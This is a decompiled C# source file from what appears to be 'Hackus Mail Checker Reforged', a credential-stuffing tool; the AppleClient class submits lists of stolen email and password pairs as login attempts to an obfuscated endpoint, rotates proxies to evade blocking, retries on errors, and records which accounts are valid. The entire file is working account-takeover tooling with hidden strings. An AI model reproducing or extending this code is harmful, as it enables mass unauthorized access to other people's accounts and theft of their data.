using System;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A0 RID: 160
	public class AppleClient
	{
		// Token: 0x17000131 RID: 305
		// (get) Token: 0x06000520 RID: 1312 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000521 RID: 1313 RVA: 0x00009A8F File Offset: 0x00007C8F
		public AppleClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000522 RID: 1314 RVA: 0x0001D2F0 File Offset: 0x0001B4F0
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok && !SearchSettings.Instance.Search)
			{
				MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
			}
		}

		// Token: 0x06000523 RID: 1315 RVA: 0x0001D360 File Offset: 0x0001B560
		private OperationResult Login()
		{
			OperationResult operationResult;
			do
			{
				this.Reset();
				operationResult = this.Authenticate();
			}
			while (operationResult == OperationResult.HttpError);
			return operationResult;
		}

		// Token: 0x06000524 RID: 1316 RVA: 0x0001D380 File Offset: 0x0001B580
		private OperationResult Authenticate()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddHeader(<Module>.smethod_5<string>(-966682162), <Module>.smethod_4<string>(-795929467));
					httpRequest.AddHeader(<Module>.smethod_4<string>(695436904), <Module>.smethod_4<string>(-970252965));
					httpRequest.AddHeader(<Module>.smethod_4<string>(1659024462), <Module>.smethod_3<string>(-1285838694));
					httpRequest.AddHeader(<Module>.smethod_3<string>(-121656043), <Module>.smethod_2<string>(-415939366));
					httpRequest.AddHeader(<Module>.smethod_2<string>(1664902849), <Module>.smethod_3<string>(-81245960));
					httpRequest.AddHeader(<Module>.smethod_2<string>(699283097), <Module>.smethod_3<string>(521050407));
					httpRequest.AddHeader(<Module>.smethod_2<string>(-298976345), <Module>.smethod_4<string>(-1857088));
					httpRequest.AddHeader(<Module>.smethod_5<string>(-702816674), <Module>.smethod_5<string>(-1462622138));
					httpRequest.AddHeader(<Module>.smethod_2<string>(168875739), <Module>.smethod_2<string>(-796744013));
					string text = JsonConvert.SerializeObject(new
					{
						accountName = this._mailbox.Address,
						password = this._mailbox.Password,
						rememberMe = false
					});
					string text2 = httpRequest.Post(<Module>.smethod_4<string>(-142522353), text, <Module>.smethod_4<string>(-423852883)).ToString();
					if (text2.ContainsOne(new string[]
					{
						<Module>.smethod_5<string>(1524144474),
						<Module>.smethod_4<string>(-1459565226),
						<Module>.smethod_6<string>(310419552)
					}))
					{
						return OperationResult.Ok;
					}
					if (text2.Contains(<Module>.smethod_4<string>(1610329265)))
					{
						return OperationResult.Blocked;
					}
					if (text2.ContainsOne(new string[]
					{
						<Module>.smethod_5<string>(1297236047),
						<Module>.smethod_4<string>(-1449948588)
					}))
					{
						return OperationResult.Bad;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000525 RID: 1317 RVA: 0x0001D5BC File Offset: 0x0001B7BC
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_5<string>(1482021352);
		}

		// Token: 0x06000526 RID: 1318 RVA: 0x00009A9E File Offset: 0x00007C9E
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x06000527 RID: 1319 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002C1 RID: 705
		private Mailbox _mailbox;

		// Token: 0x040002C2 RID: 706
		private ProxyClient _proxyClient;

		// Token: 0x040002C3 RID: 707
		private CookieDictionary _cookies;
	}
}
